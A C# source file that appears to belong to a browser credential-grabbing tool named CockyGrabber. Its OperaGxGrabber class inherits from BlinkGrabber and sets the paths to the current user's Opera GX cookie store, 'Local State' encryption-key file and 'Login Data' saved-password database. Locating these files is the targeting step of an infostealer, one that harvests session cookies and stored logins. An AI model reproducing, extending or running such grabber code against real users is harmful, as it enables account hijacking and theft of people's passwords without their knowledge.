using System;

namespace CockyGrabber.Grabbers
{
    public class OperaGxGrabber : BlinkGrabber

    {
        public override string CookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
            }
        }
    }
}